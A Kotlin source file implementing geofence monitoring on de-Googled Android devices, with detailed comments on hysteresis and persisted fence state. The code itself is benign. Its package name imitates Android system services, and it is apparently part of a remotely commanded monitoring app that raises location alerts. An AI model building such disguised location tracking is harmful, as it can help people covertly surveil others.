package com.android.systemservices

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject

/**
 * AOSP-native geofence implementation that doesn't depend on Google Play Services.
 * Uses LocationManager directly and evaluates geofences client-side via distance calculations.
 *
 * This is the fallback for GrapheneOS and other de-Googled devices where Play Services'
 * GeofencingClient cannot function properly due to sandboxing restrictions:
 *   - Sandboxed GMS can't maintain persistent background location engines
 *   - GrapheneOS reroutes location requests away from Play Services by default
 *   - PendingIntent delivery to unexported receivers is blocked
 *
 * Mirrors the same fallback pattern used for location updates in MonitoringService
 * (FusedLocationProvider → system LocationManager when Play Services is absent).
 */
class AospGeofenceManager(private val context: Context) {
    private val TAG = "AospGeofenceManager"
    private val prefs = Prefs(context)

    private var locationManager: LocationManager? = null
    private var locationListener: LocationListener? = null
    private var handlerThread: HandlerThread? = null
    private var handler: Handler? = null

    /**
     * Per-fence transition state.
     *
     * Anti-flap design (the flapping bug: devices sitting INSIDE a fence got enter/exit
     * alert pairs they never actually produced). The old code did a raw
     * `distance <= radius` test against every fix from four racing providers with the
     * inside-set kept in RAM only — one noisy fix fired EXIT, the next fired ENTER, and
     * every service start re-fired ENTER for all fences the device was already in.
     *
     * Now a transition is fired only when ALL of these hold:
     *  - the fix passes the quality gate (fresh, accuracy usable — see evaluateGeofences),
     *  - the observation is outside the hysteresis band (ENTER at <= radius, EXIT only
     *    beyond radius + max(MIN_EXIT_MARGIN_M, fix accuracy) — a Schmitt trigger),
     *  - the new state was observed by >= SETTLE_MS worth of >= 2 consistent fixes
     *    (jitter oscillates and resets the candidate; real movement persists),
     *  - [confirmedInside] is PERSISTED to Prefs.geofenceStateJson so restarts restore
     *    state instead of re-firing ENTER.
     */
    private class FenceState {
        var confirmedInside: Boolean? = null   // null = never observed (unknown)
        var candidateInside: Boolean? = null   // unconfirmed observation of a NEW state
        var candidateSince: Long = 0L
        var candidateFixes: Int = 0
        var dwellStartAt: Long = 0L            // when the current inside episode began
        var dwellFired: Boolean = false        // DWELL fires once per inside episode
    }

    private val fenceStates = mutableMapOf<String, FenceState>()
    private var statesRestored = false

    // DWELL tracking: 60 seconds loitering delay, matching GMS default
    private val DWELL_DELAY_MS = 60_000L

    // Callback for geofence transitions — set by MonitoringService
    var onTransition: ((geofenceId: String, name: String, transition: String,
                        lat: Double, lng: Double, radius: Float) -> Unit)? = null

    fun start() {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Missing ACCESS_FINE_LOCATION permission — cannot monitor geofences")
            return
        }
        // Idempotent: MonitoringService now calls start() from initGeofencing() AND from
        // every add_geofence command; without this guard each call leaked a HandlerThread.
        if (handlerThread != null) return

        handlerThread = HandlerThread("AospGeofence").apply { start() }
        handler = Handler(handlerThread!!.looper)

        locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager

        locationListener = object : LocationListener {
            override fun onLocationChanged(location: Location) {
                handler?.post { evaluateGeofences(location) }
            }
            @Deprecated("Deprecated in API 29")
            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
            override fun onProviderEnabled(provider: String) {}
            override fun onProviderDisabled(provider: String) {}
        }

        // Register on ALL available providers for best coverage. GPS gives precision
        // outdoors; NETWORK/FUSED give coarse indoor fixes via GrapheneOS NetworkLocation.
        // ⚠️ PASSIVE is the safety net: it receives every fix the app's OTHER location
        // pipelines (setupLocationUpdates Fused/system tracking) already generate, so fence
        // evaluation keeps working even when our own per-provider requests are throttled,
        // dozed, or a provider never delivers a first fix (found live 2026-08: GOS device
        // with fences synced but zero transitions — GPS-only indoors produced no callbacks).
        val providers = listOf(
            LocationManager.GPS_PROVIDER,
            LocationManager.NETWORK_PROVIDER,
            LocationManager.FUSED_PROVIDER,
            LocationManager.PASSIVE_PROVIDER
        )
        var registered = false
        for (provider in providers) {
            try {
                if (locationManager?.isProviderEnabled(provider) == true) {
                    locationManager?.requestLocationUpdates(
                        provider, 10_000L, 10f, locationListener!!, handlerThread!!.looper
                    )
                    Log.i(TAG, "Geofence location provider registered: $provider")
                    registered = true
                }
            } catch (e: Exception) {
                Log.d(TAG, "Provider $provider unavailable: ${e.message}")
            }
        }
        if (!registered) Log.w(TAG, "No location provider available for geofencing")
        else Log.i(TAG, "AOSP geofence monitoring started (${getAll().size} fences)")
    }

    fun stop() {
        try { locationListener?.let { locationManager?.removeUpdates(it) } } catch (_: Exception) {}
        locationListener = null
        locationManager = null
        handler?.removeCallbacksAndMessages(null)
        handler = null
        handlerThread?.quitSafely()
        handlerThread = null
        // In-memory state goes away with the instance, but the confirmed inside/outside
        // state lives in Prefs.geofenceStateJson — the next instance restores it and does
        // NOT re-fire ENTER for fences the device is already inside.
        fenceStates.clear()
        Log.i(TAG, "AOSP geofence monitoring stopped")
    }

    /**
     * Evaluate one location fix against all fences.
     *
     * A fix only moves the state machine when it is (a) fresh and accurate enough to be
     * trusted and (b) beyond the hysteresis band. Anything ambiguous holds the current
     * state, and a changed observation must SETTLE before it is reported.
     */
    @Synchronized   // shares the instance monitor with add/remove/clearAll/persistStates
    private fun evaluateGeofences(location: Location) {
        val entries = getAll()
        if (entries.isEmpty()) return

        // ── Fix-quality gate ──
        // PASSIVE provider can deliver stale cached fixes, and network fixes indoors can
        // be 100–300 m off — either can falsely yank a fence from "inside" to "outside".
        val ageMs = System.currentTimeMillis() - location.time
        if (ageMs > MAX_FIX_AGE_MS || ageMs < -MAX_FIX_AGE_MS) {
            Log.d(TAG, "Skipping stale fix (age=${ageMs / 1000}s)")
            return
        }
        val accuracy = if (location.hasAccuracy() && location.accuracy > 0f) location.accuracy
                       else UNKNOWN_ACCURACY_M
        if (accuracy > MAX_FIX_ACCURACY_M) {
            Log.d(TAG, "Skipping low-accuracy fix (${accuracy.toInt()}m)")
            return
        }

        restoreStatesIfNeeded()
        val now = System.currentTimeMillis()

        for (entry in entries) {
            val distance = FloatArray(1)
            Location.distanceBetween(
                location.latitude, location.longitude,
                entry.lat, entry.lng, distance
            )

            val state = fenceStates.getOrPut(entry.id) { FenceState() }

            // ── Schmitt trigger (hysteresis band) ──
            // inside:  distance <= radius
            // outside: distance > radius + max(MIN_EXIT_MARGIN_M, fix accuracy)
            // between: ambiguous — keep the current state, no candidate update
            val observed: Boolean? = when {
                distance[0] <= entry.radius -> true
                distance[0] > entry.radius + maxOf(MIN_EXIT_MARGIN_M, accuracy) -> false
                else -> null
            }
            if (observed == null) continue

            val confirmed = state.confirmedInside
            if (confirmed == null) {
                // First-ever observation of this fence (new fence, or cleared state).
                // Seed silently when outside — you can't "exit" a fence you were never
                // seen inside. When inside, fire ENTER once (GMS INITIAL_TRIGGER
                // semantics + covers "entered while the service was down"), and persist
                // so service restarts never repeat it.
                state.confirmedInside = observed
                persistStates()
                Log.i(TAG, "Seeded state for ${entry.name} (${entry.id}): inside=$observed")
                if (observed) {
                    state.dwellStartAt = now
                    if (entry.transitions and GEOFENCE_ENTER != 0) {
                        fire(entry, "enter", distance[0])
                    }
                }
                continue
            }

            if (observed == confirmed) {
                // Still (or again) in the confirmed state — any pending candidate collapsed.
                state.candidateInside = null
                state.candidateFixes = 0
                if (observed) checkDwell(entry, state, now)
                continue
            }

            // ── Observation contradicts confirmed state → candidate transition ──
            if (state.candidateInside != observed) {
                state.candidateInside = observed
                state.candidateSince = now
                state.candidateFixes = 1
                continue
            }
            state.candidateFixes++
            if (now - state.candidateSince < SETTLE_MS || state.candidateFixes < 2) continue

            // Settled: the new state persisted long enough and across >= 2 fixes.
            state.confirmedInside = observed
            state.candidateInside = null
            state.candidateFixes = 0
            persistStates()
            if (observed) {
                state.dwellStartAt = now
                state.dwellFired = false
                if (entry.transitions and GEOFENCE_ENTER != 0) {
                    fire(entry, "enter", distance[0])
                }
            } else {
                state.dwellStartAt = 0L
                state.dwellFired = false
                if (entry.transitions and GEOFENCE_EXIT != 0) {
                    fire(entry, "exit", distance[0])
                }
            }
        }
    }

    private fun checkDwell(entry: GeofenceManager.Entry, state: FenceState, now: Long) {
        if (state.dwellFired || state.dwellStartAt == 0L) return
        if (entry.transitions and GEOFENCE_DWELL == 0) return
        if (now - state.dwellStartAt >= DWELL_DELAY_MS) {
            state.dwellFired = true
            fire(entry, "dwell", -1f)
        }
    }

    private fun fire(entry: GeofenceManager.Entry, transition: String, distanceM: Float) {
        Log.i(TAG, "${transition.uppercase()}: ${entry.name} (${entry.id})" +
            (if (distanceM >= 0f) " @ ${distanceM.toInt()}m" else ""))
        onTransition?.invoke(entry.id, entry.name, transition,
            entry.lat, entry.lng, entry.radius)
    }

    @Synchronized
    private fun restoreStatesIfNeeded() {
        if (statesRestored) return
        statesRestored = true
        try {
            val o = JSONObject(prefs.geofenceStateJson.ifEmpty { "{}" })
            for (id in o.keys()) {
                fenceStates[id] = FenceState().apply { confirmedInside = o.getBoolean(id) }
            }
        } catch (e: Exception) {
            Log.e(TAG, "geofence state restore error: ${e.message}")
        }
    }

    @Synchronized
    private fun persistStates() {
        val o = JSONObject()
        for ((id, st) in fenceStates) st.confirmedInside?.let { o.put(id, it) }
        prefs.geofenceStateJson = o.toString()
    }

    /** Forget one fence's transition state (fence removed, or its geometry changed). */
    @Synchronized
    private fun dropState(id: String) {
        restoreStatesIfNeeded()
        fenceStates.remove(id)
        persistStates()
    }

    @Synchronized
    fun add(entry: GeofenceManager.Entry) {
        // Re-adding a fence with DIFFERENT geometry invalidates its transition state —
        // the old inside/outside verdict no longer applies to the new circle.
        val prev = getAll().firstOrNull { it.id == entry.id }
        persist(entry)
        if (prev != null && (prev.lat != entry.lat || prev.lng != entry.lng || prev.radius != entry.radius)) {
            dropState(entry.id)
        }
        Log.i(TAG, "Added geofence ${entry.id} r=${entry.radius}m transitions=${entry.transitions}")
    }

    @Synchronized
    fun remove(id: String) {
        delete(id)
        dropState(id)
        Log.i(TAG, "Removed geofence $id")
    }

    @Synchronized
    fun clearAll() {
        prefs.geofencesJson = "[]"
        prefs.geofenceStateJson = "{}"
        fenceStates.clear()
        Log.i(TAG, "All geofences cleared")
    }

    fun getAll(): List<GeofenceManager.Entry> {
        return try {
            val arr = JSONArray(prefs.geofencesJson.ifEmpty { "[]" })
            (0 until arr.length()).map { i ->
                val o = arr.getJSONObject(i)
                GeofenceManager.Entry(
                    id          = o.getString("id"),
                    name        = o.optString("name", o.getString("id")),
                    lat         = o.getDouble("lat"),
                    lng         = o.getDouble("lng"),
                    radius      = o.getDouble("radius").toFloat(),
                    transitions = o.optInt("transitions",
                        GEOFENCE_ENTER or GEOFENCE_EXIT)
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "getAll parse error: ${e.message}")
            emptyList()
        }
    }

    fun reloadAll() {
        // ⚠️ Do NOT reset transition state here — reloadAll() runs on every service start
        // (initGeofencing). The old "re-evaluate from scratch" reset re-fired ENTER for
        // every fence the device was already inside: a false "entered" alert per restart.
        // Confirmed state is restored from Prefs.geofenceStateJson instead.
        restoreStatesIfNeeded()
        Log.i(TAG, "Reloaded ${getAll().size} geofence(s)")
    }

    private fun persist(entry: GeofenceManager.Entry) {
        val arr = JSONArray(prefs.geofencesJson.ifEmpty { "[]" })
        var replaced = false
        for (i in 0 until arr.length()) {
            if (arr.getJSONObject(i).optString("id") == entry.id) {
                arr.put(i, entry.toJson())
                replaced = true
                break
            }
        }
        if (!replaced) arr.put(entry.toJson())
        prefs.geofencesJson = arr.toString()
    }

    private fun delete(id: String) {
        val arr = JSONArray(prefs.geofencesJson.ifEmpty { "[]" })
        val out = JSONArray()
        for (i in 0 until arr.length()) {
            val o = arr.getJSONObject(i)
            if (o.optString("id") != id) out.put(o)
        }
        prefs.geofencesJson = out.toString()
    }

    companion object {
        // Mirror the GMS Geofence constants so callers don't need the GMS import
        const val GEOFENCE_ENTER = 1
        const val GEOFENCE_EXIT  = 2
        const val GEOFENCE_DWELL = 4

        // ── Anti-flap tuning ─────────────────────────────────────────────────────
        // Fixes older than this are ignored (PASSIVE provider delivers cached fixes).
        private const val MAX_FIX_AGE_MS = 120_000L
        // Fixes less accurate than this can't discriminate a fence — ignored entirely.
        private const val MAX_FIX_ACCURACY_M = 500f
        // Assumed accuracy for fixes without an accuracy field.
        private const val UNKNOWN_ACCURACY_M = 50f
        // EXIT hysteresis: a fence is only "left" once the fix is beyond
        // radius + max(this, fix accuracy). ENTER still requires distance <= radius.
        // Kills boundary jitter (and whole-fence flips from poor-accuracy fixes).
        private const val MIN_EXIT_MARGIN_M = 30f
        // A changed observation must persist this long, across >= 2 fixes, before a
        // transition is fired. Jitter oscillates and resets the candidate; real
        // movement persists. Also means a very fast drive-through of a small fence may
        // collapse to (at most) one alert instead of a pair — deliberate trade-off.
        private const val SETTLE_MS = 20_000L
    }
}
